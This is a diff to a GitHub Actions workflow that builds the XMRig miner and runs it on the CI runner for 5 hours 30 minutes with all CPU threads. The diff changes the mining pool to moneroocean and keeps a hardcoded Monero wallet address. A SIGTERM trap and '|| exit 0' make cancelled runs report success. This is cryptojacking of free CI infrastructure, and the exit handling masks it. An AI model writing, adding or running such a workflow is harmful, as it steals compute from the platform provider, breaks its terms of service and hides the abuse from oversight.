@@ -25,16 +25,17 @@ jobs:
           cmake ..
           make -j$(nproc)
 
-      - name: Run XMRig for 5 hours 30 minutes with clean exit
+      - name: Run XMRig for 5h 30m with clean exit
         run: |
           cd xmrig/build
 
-          # Trap SIGTERM for clean shutdown
+          # Trap SIGTERM for graceful exit
           trap "echo 'Job canceled, exiting successfully'; exit 0" SIGTERM
 
-          # Run miner with a timeout of 19800 seconds (5h 30m)
+          # Run for 5 hours 30 minutes (19800 seconds)
           timeout 19800s ./xmrig \
-            -o pool.supportxmr.com:7777 \
+            -o gulf.moneroocean.stream:10128 \
             -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1 \
             -p github-run \
+            -k --coin monero \
             -t $(nproc) || exit 0
